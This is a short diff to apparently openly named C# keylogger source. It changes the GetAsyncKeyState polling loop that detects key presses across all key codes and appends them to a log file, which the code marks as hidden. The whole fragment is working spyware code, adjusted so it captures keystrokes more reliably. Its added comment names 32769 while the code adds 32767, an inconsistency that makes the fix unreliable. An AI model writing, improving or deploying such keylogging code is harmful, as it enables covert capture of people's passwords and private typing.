@@ -33,7 +33,8 @@ namespace KeyLogger
                 for (int i = 0; i < 255; i++)
                 {
                     int key = GetAsyncKeyState(i);
-                    if (key == 1 || key == -32767)
+                    // 32769 should be used for windows 10.
+                    if (key == 1 || key == -32767 || key == 32767)
                     {
                         StreamWriter file = new StreamWriter(path, true);
                         File.SetAttributes(path, FileAttributes.Hidden);
